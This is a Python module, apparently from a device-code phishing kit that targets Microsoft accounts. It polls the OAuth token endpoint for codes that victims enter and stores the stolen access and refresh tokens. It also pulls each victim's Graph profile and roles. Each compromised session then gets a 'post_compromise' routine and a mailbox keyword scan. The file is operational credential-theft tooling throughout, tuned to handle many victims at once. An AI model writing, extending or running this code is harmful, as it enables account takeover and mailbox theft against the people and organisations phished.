# ── poller.py ───────────────────────────────────────────
import time
import logging
import threading
import datetime
from concurrent.futures import ThreadPoolExecutor
from config import Config
import db
import oauth
import graph
import executor

logger = logging.getLogger(__name__)

# How many device-code polls may be in flight at once. Microsoft's token endpoint
# tolerates a modest fan-out; keeping it bounded avoids connection storms while
# still letting a burst of concurrent visitors be serviced in one cycle instead
# of one-per-5-seconds.
MAX_CONCURRENT_POLLS = int(getattr(Config, 'POLL_CONCURRENCY', 20))

# Per-session backoff state for the `slow_down` error. Microsoft asks clients to
# increase their polling interval by 5s each time it is returned; without this the
# poller hammers the endpoint and every session in the burst degrades together.
_slowdown_until = {}
_slowdown_step = {}


class TokenPoller(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._running = True
        self._pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_POLLS,
                                        thread_name_prefix='tokenpoll')
        self._inflight = set()
        self._inflight_lock = threading.Lock()

    # ── one session ────────────────────────────────────────────────────────
    def _poll_one(self, session):
        user_code = session['user_code']
        try:
            created_at = session.get('created_at')
            if created_at:
                try:
                    dt = datetime.datetime.strptime(created_at[:19], '%Y-%m-%d %H:%M:%S')
                    created_ts = int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())
                    if (int(time.time()) - created_ts) > 900:
                        logger.info(f"[POLLER] Session {user_code} expired after 15 minutes of inactivity.")
                        db.update_session_status(user_code, 'EXPIRED')
                        _slowdown_until.pop(user_code, None)
                        _slowdown_step.pop(user_code, None)
                        return
                except Exception:
                    pass

            _is_personal = (session.get('account_type') or 'work') == 'personal'
            if _is_personal:
                # v1 flow — consumer accounts use the legacy endpoint with
                # resource=graph.windows.net and code= in the token exchange.
                status, access_token, refresh_token, raw_data = oauth.poll_token_v1(session['device_code'])
            else:
                status, access_token, refresh_token, raw_data = oauth.poll_token(session['device_code'])

            if status == 'SLOW_DOWN':
                # Back off this specific session; do NOT treat as failure.
                step = _slowdown_step.get(user_code, 0) + 5
                _slowdown_step[user_code] = step
                _slowdown_until[user_code] = time.time() + step
                logger.debug(f"[POLLER] {user_code} slow_down — backing off {step}s")
                return

            if status == 'SUCCESS':
                _slowdown_until.pop(user_code, None)
                _slowdown_step.pop(user_code, None)
                db.update_session_token(user_code, access_token, refresh_token, raw_data)

                profile = graph.get_user_profile(access_token)
                if 'error' not in profile:
                    v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
                    v_name = profile.get('displayName') or 'Unknown'
                    v_role = profile.get('jobTitle') or ''
                    if not v_role:
                        try:
                            roles_res = graph.get_user_directory_roles(access_token)
                            if roles_res and 'value' in roles_res and len(roles_res['value']) > 0:
                                v_role = roles_res['value'][0].get('displayName', 'Member')
                            else:
                                v_role = 'User'
                        except Exception:
                            v_role = 'Member'
                    db.update_session_profile(user_code, v_name, v_email, v_role)

                threading.Thread(
                    target=executor.execute_post_compromise,
                    args=(user_code,),
                    daemon=True
                ).start()

                try:
                    import keyword_watcher
                    updated_session = db.get_session(user_code)
                    if updated_session:
                        threading.Thread(
                            target=keyword_watcher.scan_victim_mailbox,
                            args=(updated_session,),
                            daemon=True
                        ).start()
                except Exception as e:
                    logger.warning(f"Failed to launch keyword watcher for {user_code}: {e}")

            elif status in ('EXPIRED', 'INVALID_GRANT'):
                _slowdown_until.pop(user_code, None)
                _slowdown_step.pop(user_code, None)
                db.update_session_status(user_code, status)
        except Exception as e:
            logger.error(f"[POLLER] Unhandled error polling {user_code}: {e}")
        finally:
            with self._inflight_lock:
                self._inflight.discard(user_code)

    # ── main loop ──────────────────────────────────────────────────────────
    def run(self):
        logger.info(f"Microsoft token poller thread started (concurrency={MAX_CONCURRENT_POLLS}).")
        while self._running:
            try:
                now = time.time()
                for session in db.get_pending_sessions():
                    uc = session['user_code']
                    with self._inflight_lock:
                        if uc in self._inflight:
                            continue          # still being polled from a previous cycle
                        if _slowdown_until.get(uc, 0) > now:
                            continue          # honour slow_down backoff
                        self._inflight.add(uc)
                    try:
                        self._pool.submit(self._poll_one, session)
                    except Exception as e:
                        with self._inflight_lock:
                            self._inflight.discard(uc)
                        logger.error(f"[POLLER] Submit failed for {uc}: {e}")
            except Exception as e:
                logger.error(f"[POLLER] Cycle error: {e}")

            time.sleep(Config.POLL_INTERVAL)

    def stop(self):
        self._running = False
        self._pool.shutdown(wait=False)
